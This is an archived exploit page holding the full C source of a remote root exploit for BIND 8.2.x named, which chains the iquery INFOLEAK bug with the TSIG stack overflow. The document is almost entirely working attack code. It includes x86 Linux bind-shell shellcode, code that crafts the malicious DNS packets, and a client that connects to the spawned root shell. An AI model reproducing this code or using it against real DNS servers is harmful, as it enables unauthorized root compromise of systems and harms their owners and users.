<html><head><title>BIND 8.2.x (TSIG) Remote Root Stack Overflow Exploit (4)</title></head><pre>/*
 * This exploit has been fixed and extensive explanation and clarification
 * added.
 * Cleanup done by:
 *     Ian Goldberg     &lt;ian@cypherpunks.ca&gt;
 *     Jonathan Wilkins &lt;jwilkins@bitland.net&gt;
 * NOTE: the default installation of RedHat 6.2 seems to not be affected
 * due to the compiler options.  If BIND is built from source then the
 * bug is able to manifest itself.
 */
/*
 * Original Comment:
 * lame named 8.2.x remote exploit by
 *
 *   Ix		[adresadeforward@yahoo.com] (the master of jmpz),
 *   lucysoft	[lucysoft@hotmail.com] (the master of queries)
 *
 * this exploits the named INFOLEAK and TSIG bug (see http://www.isc.org/products/BIND/bind-security.html)
 * linux only shellcode
 * this is only for demo purposes, we are not responsable in any way for what you do with this code.
 *
 * flamez 	- canaris
 * greetz	- blizzard, netman.
 * creditz	- anathema &lt;anathema@hack.co.za&gt; for the original shellcode
 *  		- additional code ripped from statdx exploit by ron1n
 *
 * woo, almost forgot... this exploit is pretty much broken (+4 errors), but we hope you got the idea.
 * if you understand how it works, it won't be too hard to un-broke it
 */

#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;time.h&gt;
#include &lt;string.h&gt;
#include &lt;ctype.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/in_systm.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;arpa/nameser.h&gt;

#define max(a,b) ((a)&gt;(b)?(a):(b))

#define BUFFSIZE 4096

int argevdisp1, argevdisp2;

char shellcode[] =
/* The numbers at the right indicate the number of bytes the call takes
 * and the number of bytes used so far.  This needs to be lower than
 * 62 in order to fit in a single Query Record.  2 are used in total to
 * send the shell code
 */
/* main: */
/* &quot;callz&quot; is more than 127 bytes away, so we jump to an intermediate
   spot first */
&quot;\xeb\x44&quot;                           /* jmp intr                */ // 2 - 2
/* start: */
&quot;\x5e&quot;                               /* popl %esi               */ // 1 - 3

  /* socket() */
&quot;\x29\xc0&quot;                           /* subl %eax, %eax         */ // 2 - 5
&quot;\x89\x46\x10&quot;                       /* movl %eax, 0x10(%esi)   */ // 3 - 8
&quot;\x40&quot;                               /* incl %eax               */ // 1 - 9
&quot;\x89\xc3&quot;                           /* movl %eax, %ebx         */ // 2 - 11
&quot;\x89\x46\x0c&quot;                       /* movl %eax, 0x0c(%esi)   */ // 3 - 14
&quot;\x40&quot;                               /* incl %eax               */ // 1 - 15
&quot;\x89\x46\x08&quot;                       /* movl %eax, 0x08(%esi)   */ // 3 - 18
&quot;\x8d\x4e\x08&quot;                       /* leal 0x08(%esi), %ecx   */ // 3 - 21
&quot;\xb0\x66&quot;                           /* movb $0x66, %al         */ // 2 - 23
&quot;\xcd\x80&quot;                           /* int $0x80               */ // 2 - 25

  /* bind() */
&quot;\x43&quot;                               /* incl %ebx               */ // 1 - 26
&quot;\xc6\x46\x10\x10&quot;                   /* movb $0x10, 0x10(%esi)  */ // 4 - 30
&quot;\x66\x89\x5e\x14&quot;                   /* movw %bx, 0x14(%esi)    */ // 4 - 34
&quot;\x88\x46\x08&quot;                       /* movb %al, 0x08(%esi)    */ // 3 - 37
&quot;\x29\xc0&quot;                           /* subl %eax, %eax         */ // 2 - 39
&quot;\x89\xc2&quot;                           /* movl %eax, %edx         */ // 2 - 41
&quot;\x89\x46\x18&quot;                       /* movl %eax, 0x18(%esi)   */ // 3 - 44
/*
 * the port address in hex (0x9000 = 36864), if this is changed, then a similar
 * change must be made in the connection() call
 * NOTE: you only get to set the high byte
 */
&quot;\xb0\x90&quot;                           /* movb $0x90, %al         */ // 2 - 46
&quot;\x66\x89\x46\x16&quot;                   /* movw %ax, 0x16(%esi)    */ // 4 - 50
&quot;\x8d\x4e\x14&quot;                       /* leal 0x14(%esi), %ecx   */ // 3 - 53
&quot;\x89\x4e\x0c&quot;                       /* movl %ecx, 0x0c(%esi)   */ // 3 - 56
&quot;\x8d\x4e\x08&quot;                       /* leal 0x08(%esi), %ecx   */ // 3 - 59

&quot;\xeb\x02&quot;                           /* jmp cont                */ // 2 - 2
/* intr: */
&quot;\xeb\x43&quot;                           /* jmp callz               */ // 2 - 4

/* cont: */
&quot;\xb0\x66&quot;                           /* movb $0x66, %al         */ // 2 - 6
&quot;\xcd\x80&quot;                           /* int $0x80               */ // 2 - 10

  /* listen() */
&quot;\x89\x5e\x0c&quot;                       /* movl %ebx, 0x0c(%esi)   */ // 3 - 11
&quot;\x43&quot;                               /* incl %ebx               */ // 1 - 12
&quot;\x43&quot;                               /* incl %ebx               */ // 1 - 13
&quot;\xb0\x66&quot;                           /* movb $0x66, %al         */ // 2 - 15
&quot;\xcd\x80&quot;                           /* int $0x80               */ // 2 - 17

  /* accept() */
&quot;\x89\x56\x0c&quot;                       /* movl %edx, 0x0c(%esi)   */ // 3 - 20
&quot;\x89\x56\x10&quot;                       /* movl %edx, 0x10(%esi)   */ // 3 - 23
&quot;\xb0\x66&quot;                           /* movb $0x66, %al         */ // 2 - 25
&quot;\x43&quot;                               /* incl %ebx               */ // 1 - 26
&quot;\xcd\x80&quot;                           /* int $0x80               */ // 1 - 27

  /* dup2(s, 0); dup2(s, 1); dup2(s, 2); */
&quot;\x86\xc3&quot;                           /* xchgb %al, %bl          */ // 2 - 29
&quot;\xb0\x3f&quot;                           /* movb $0x3f, %al         */ // 2 - 31
&quot;\x29\xc9&quot;                           /* subl %ecx, %ecx         */ // 2 - 33
&quot;\xcd\x80&quot;                           /* int $0x80               */ // 2 - 35
&quot;\xb0\x3f&quot;                           /* movb $0x3f, %al         */ // 2 - 37
&quot;\x41&quot;                               /* incl %ecx               */ // 1 - 38
&quot;\xcd\x80&quot;                           /* int $0x80               */ // 2 - 40
&quot;\xb0\x3f&quot;                           /* movb $0x3f, %al         */ // 2 - 42
&quot;\x41&quot;                               /* incl %ecx               */ // 1 - 43
&quot;\xcd\x80&quot;                           /* int $0x80               */ // 2 - 45

  /* execve() */
&quot;\x88\x56\x07&quot;                       /* movb %dl, 0x07(%esi)    */ // 3 - 48
&quot;\x89\x76\x0c&quot;                       /* movl %esi, 0x0c(%esi)   */ // 3 - 51
&quot;\x87\xf3&quot;                           /* xchgl %esi, %ebx        */ // 2 - 53
&quot;\x8d\x4b\x0c&quot;                       /* leal 0x0c(%ebx), %ecx   */ // 3 - 56
&quot;\xb0\x0b&quot;                           /* movb $0x0b, %al         */ // 2 - 58
&quot;\xcd\x80&quot;                           /* int $0x80               */ // 2 - 60

&quot;\x90&quot;

/* callz: */
&quot;\xe8\x72\xff\xff\xff&quot;               /* call start              */ // 5 - 5
&quot;/bin/sh&quot;; /* There's a NUL at the end here */                     // 8 - 13

unsigned long resolve_host(char* host)
{
	long res;
	struct hostent* he;

	if (0 &gt; (res = inet_addr(host)))
	{
		if (!(he = gethostbyname(host)))
			return(0);
		res = *(unsigned long*)he-&gt;h_addr;
	}
	return(res);
}

int dumpbuf(char *buff, int len)
{
	char line[17];
	int x;

	/* print out a pretty hex dump */
	for(x=0;x&lt;len;x++){
		if(!(x%16) &amp;&amp; x){
			line[16] = 0;
			printf(&quot;\t%s\n&quot;, line);
		}
		printf(&quot;%02X &quot;, (unsigned char)buff[x]);
		if(isprint((unsigned char)buff[x]))
			line[x%16]=buff[x];
		else
			line[x%16]='.';
	}
	printf(&quot;\n&quot;);
}

void
runshell(int sockd)
{
    char buff[1024];
    int fmax, ret;
    fd_set fds;

    fmax = max(fileno(stdin), sockd) + 1;
    send(sockd, &quot;uname -a; id;\n&quot;, 15, 0);

    for(;;)
    {

        FD_ZERO(&amp;fds);
        FD_SET(fileno(stdin), &amp;fds);
        FD_SET(sockd, &amp;fds);

        if(select(fmax, &amp;fds, NULL, NULL, NULL) &lt; 0)
        {
            exit(EXIT_FAILURE);
        }

        if(FD_ISSET(sockd, &amp;fds))
        {
            bzero(buff, sizeof buff);
            if((ret = recv(sockd, buff, sizeof buff, 0)) &lt; 0)
            {
                exit(EXIT_FAILURE);
            }
            if(!ret)
            {
                fprintf(stderr, &quot;Connection closed\n&quot;);
                exit(EXIT_FAILURE);
            }
            write(fileno(stdout), buff, ret);
        }

        if(FD_ISSET(fileno(stdin), &amp;fds))
        {
            bzero(buff, sizeof buff);
            ret = read(fileno(stdin), buff, sizeof buff);
            if(send(sockd, buff, ret, 0) != ret)
            {
                fprintf(stderr, &quot;Transmission loss\n&quot;);
                exit(EXIT_FAILURE);
            }
        }
    }
}


connection(struct sockaddr_in host)
{
	int sockd;

	host.sin_port = htons(36864);

	printf(&quot;[*] connecting..\n&quot;);
	usleep(2000);

	if((sockd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0)
	{
		exit(EXIT_FAILURE);
	}

	if(connect(sockd, (struct sockaddr *) &amp;host, sizeof host) != -1)
	{
		printf(&quot;[*] wait for your shell..\n&quot;);
		usleep(500);
	        runshell(sockd);
	}
	else
	{
		printf(&quot;[x] error: named not vulnerable or wrong offsets used\n&quot;);
	}

	close(sockd);
}




int infoleak_qry(char* buff)
{
        HEADER* hdr;
        int n, k;
        char* ptr;
        int qry_space = 12;
        int dummy_names = 7;
        int evil_size = 0xff;

        memset(buff, 0, BUFFSIZE);
        hdr = (HEADER*)buff;

        hdr-&gt;id = htons(0xbeef);
        hdr-&gt;opcode  = IQUERY;
        hdr-&gt;rd      = 1;
        hdr-&gt;ra      = 1;
        hdr-&gt;qdcount = htons(0);
        hdr-&gt;nscount = htons(0);
        hdr-&gt;ancount = htons(1);
        hdr-&gt;arcount = htons(0);


	ptr = buff + sizeof(HEADER);
	printf(&quot;[d] HEADER is %d long\n&quot;, sizeof(HEADER));
	
	n = 62;

	for(k=0; k &lt; dummy_names; k++)
	{
		*ptr++ = n;
		ptr += n;
	}
	ptr += 1;

        PUTSHORT(1/*ns_t_a*/, ptr);              /* type */
        PUTSHORT(T_A, ptr);                      /* class */
        PUTLONG(1, ptr);                		/* ttl */

	PUTSHORT(evil_size, ptr);			/* our *evil* size */
	
	return(ptr - buff + qry_space);
	
}



int evil_query(char* buff, int offset)
{
	int lameaddr, shelladdr, rroffsetidx, rrshellidx, deplshellcode, offset0;
	HEADER* hdr;
	char *ptr;
	int k, bufflen;
	u_int n, m;
	u_short s;
	int i;
	int shelloff, shellstarted, shelldone;
	int towrite, ourpack;
	int n_dummy_rrs = 7;

	printf(&quot;[d] evil_query(buff, %08x)\n&quot;, offset);
	printf(&quot;[d] shellcode is %d long\n&quot;, sizeof(shellcode));

	shelladdr = offset - 0x200;

        lameaddr  = shelladdr + 0x300;
	
	ourpack = offset - 0x250 + 2;
	towrite = (offset &amp; ~0xff) - ourpack - 6;
	printf(&quot;[d] olb = %d\n&quot;, (unsigned char) (offset &amp; 0xff));

	rroffsetidx = towrite / 70;
	offset0 = towrite - rroffsetidx * 70;

	if ((offset0 &gt; 52) || (rroffsetidx &gt; 6))
	{
		printf(&quot;[x] could not write our data in buffer (offset0=%d, rroffsetidx=%d)\n&quot;, offset0, rroffsetidx);
		return(-1);
	}
		
	rrshellidx = 1;
	deplshellcode = 2;
	
	hdr = (HEADER*)buff;
	
	memset(buff, 0, BUFFSIZE);
	
	/* complete the header */
	
	hdr-&gt;id = htons(0xdead);
	hdr-&gt;opcode  = QUERY;
	hdr-&gt;rd      = 1;
	hdr-&gt;ra      = 1;
	hdr-&gt;qdcount = htons(n_dummy_rrs);
	hdr-&gt;ancount = htons(0);
	hdr-&gt;arcount = htons(1);
	
	ptr = buff + sizeof(HEADER);
	
	shellstarted = 0;
	shelldone = 0;
	shelloff = 0;
	
	n = 63;
	for (k = 0; k &lt; n_dummy_rrs; k++)
	{
		*ptr++ = (char)n;
		
		for(i = 0; i &lt; n-2; i++)
		{
			if((k == rrshellidx) &amp;&amp; (i == deplshellcode) &amp;&amp; !shellstarted)
			{
				printf(&quot;[*] injecting shellcode at %d\n&quot;, k);
				shellstarted = 1;
			}
		
			if ((k == rroffsetidx) &amp;&amp; (i == offset0))
			{
				*ptr++ = lameaddr &amp; 0x000000ff;
				*ptr++ = (lameaddr &amp; 0x0000ff00) &gt;&gt; 8;
				*ptr++ = (lameaddr &amp; 0x00ff0000) &gt;&gt; 16;
				*ptr++ = (lameaddr &amp; 0xff000000) &gt;&gt; 24;
				*ptr++ = shelladdr &amp; 0x000000ff;
				*ptr++ = (shelladdr &amp; 0x0000ff00) &gt;&gt; 8;
				*ptr++ = (shelladdr &amp; 0x00ff0000) &gt;&gt; 16;
				*ptr++ = (shelladdr &amp; 0xff000000) &gt;&gt; 24;
                                *ptr++ = argevdisp1 &amp; 0x000000ff;
                                *ptr++ = (argevdisp1 &amp; 0x0000ff00) &gt;&gt; 8;
                                *ptr++ = (argevdisp1 &amp; 0x00ff0000) &gt;&gt; 16;
                                *ptr++ = (argevdisp1 &amp; 0xff000000) &gt;&gt; 24;
                                *ptr++ = argevdisp2 &amp; 0x000000ff;
                                *ptr++ = (argevdisp2 &amp; 0x0000ff00) &gt;&gt; 8;
                                *ptr++ = (argevdisp2 &amp; 0x00ff0000) &gt;&gt; 16;
                                *ptr++ = (argevdisp2 &amp; 0xff000000) &gt;&gt; 24;
				i += 15;
			}
			else
			{
				if (shellstarted &amp;&amp; !shelldone)
				{
					*ptr++ = shellcode[shelloff++];	
					if(shelloff == (sizeof(shellcode)))
						shelldone=1;
				}
				else
				{
					*ptr++ = i;
				}
			}
		}
		
		/* OK: this next set of bytes constitutes the end of the
                 *     NAME field, the QTYPE field, and the QCLASS field.
                 *     We have to have the shellcode skip over these bytes,
                 *     as well as the leading 0x3f (63) byte for the next
                 *     NAME field.  We do that by putting a jmp instruction
                 *     here.
                 */
		*ptr++ = 0xeb;
		
		if (k == 0)
		{
			*ptr++ = 10;
			
			/* For alignment reasons, we need to stick an extra
                         * NAME segment in here, of length 3 (2 + header).
                         */
			m = 2;
			*ptr++ = (char)m;        // header
			ptr += 2;
		}
		else
		{
			*ptr++ = 0x07;
		}
		
		/* End the NAME with a compressed pointer.  Note that it's
                 * not clear that the value used, C0 00, is legal (it
                 * points to the beginning of the packet), but BIND apparently
                 * treats such things as name terminators, anyway.
                 */
		*ptr++ = 0xc0; /*NS_CMPRSFLGS*/
		*ptr++ = 0x00; /*NS_CMPRSFLGS*/
		
		ptr += 4;      /* QTYPE, QCLASS */
	}
	
	/* Now we make the TSIG AR */
	*ptr++ = 0x00;       /* Empty name */

	PUTSHORT(0xfa, ptr); /* Type  TSIG */
	PUTSHORT(0xff, ptr); /* Class ANY  */

	bufflen = ptr - buff;
	
	// dumpbuf(buff, bufflen);

	return(bufflen);
}

long xtract_offset(char* buff, int len)
{
	long ret;
	
	/* Here be dragons. */
	/* (But seriously, the values here depend on compilation options
         *  used for BIND.
         */
	ret = *((long*)&amp;buff[0x214]);
	argevdisp1 = 0x080d7cd0;
	argevdisp2 = *((long*)&amp;buff[0x264]);
	printf(&quot;[d] argevdisp1 = %08x, argevdisp2 = %08x\n&quot;,
		argevdisp1, argevdisp2);
	
	// dumpbuf(buff, len);
	
	return(ret);
}




int main(int argc, char* argv[])
{
	struct sockaddr_in sa;
	int sock;
	long address;
	char buff[BUFFSIZE];
	int len, i;
	long offset;
	socklen_t reclen;
	unsigned char foo[4];

	printf(&quot;[*] named 8.2.x (&lt; 8.2.3-REL) remote root exploit by lucysoft, Ix\n&quot;);
	printf(&quot;[*] fixed by ian@cypherpunks.ca and jwilkins@bitland.net\n\n&quot;);

	address = 0;
	if (argc &lt; 2)
	{
		printf(&quot;[*] usage : %s host\n&quot;, argv[0]);

		return(-1);
	}

	if (!(address = resolve_host(argv[1])))
	{
		printf(&quot;[x] unable to resolve %s, try using an IP address\n&quot;, argv[1]);
		return(-1);
	} else {
		memcpy(foo, &amp;address, 4);
		printf(&quot;[*] attacking %s (%d.%d.%d.%d)\n&quot;, argv[1], foo[0], foo[1], foo[2], foo[3]);
	}
	
	sa.sin_family = AF_INET;

	if (0 &gt; (sock = socket(sa.sin_family, SOCK_DGRAM, 0)))
	{
		return(-1);
	}
	
	sa.sin_family = AF_INET;
	sa.sin_port = htons(53);
	sa.sin_addr.s_addr= address;
	
	
	len = infoleak_qry(buff);
	printf(&quot;[d] infoleak_qry was %d long\n&quot;, len);
	len = sendto(sock, buff, len, 0 , (struct sockaddr *)&amp;sa, sizeof(sa));
	if (len &lt; 0)
	{
		printf(&quot;[*] unable to send iquery\n&quot;);
		return(-1);
	}
	
	reclen = sizeof(sa);
	len = recvfrom(sock, buff, BUFFSIZE, 0, (struct sockaddr *)&amp;sa, &amp;reclen);
	if (len &lt; 0)
	{
                printf(&quot;[x] unable to receive iquery answer\n&quot;);
                return(-1);	
	}
	printf(&quot;[*] iquery resp len = %d\n&quot;, len);
	
	offset = xtract_offset(buff, len);
	printf(&quot;[*] retrieved stack offset = %x\n&quot;, offset);
	
	
	len = evil_query(buff, offset);
	if(len &lt; 0){
		printf(&quot;[x] error sending tsig packet\n&quot;);
		return(0);
	}
	
	sendto(sock, buff, len, 0 , (struct sockaddr *)&amp;sa, sizeof(sa));
	
	if (0 &gt; close(sock))
	{
		return(-1);
	}

	connection(sa);

	return(0);	
}

// milw0rm.com [2001-03-02]</pre></html>